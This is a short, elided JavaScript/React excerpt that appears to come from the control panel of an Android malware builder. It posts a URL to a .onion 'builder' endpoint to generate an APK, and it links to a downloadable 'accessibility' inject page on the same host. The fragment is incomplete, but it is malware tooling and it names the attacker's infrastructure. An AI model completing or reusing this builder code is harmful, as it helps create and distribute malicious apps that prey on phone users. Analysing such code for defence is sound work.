...
class BuilderConfig extends React.Component {
    ...
    GetAPKFromBuilder() {
        ...
        let request = $.ajax({
            type: 'POST',
            url: 'http://tz2u6iex7sxp4fzw.onion/builder/start.php',
            data: {
                url: this.state.url,
    ...
    render () {
        ...
        return (
            <React.Fragment>
                ...
                <div class="input-group mb-3">
                    <div class="input-group-prepend">
                        <span class="input-group-text">Select Accessibility Page (<a class="warn" href="http://tz2u6iex7sxp4fzw.onion/injects/accessibility.html" download>DOWNLOAD</a>)</span>
                    </div>
                    <div class="custom-file">
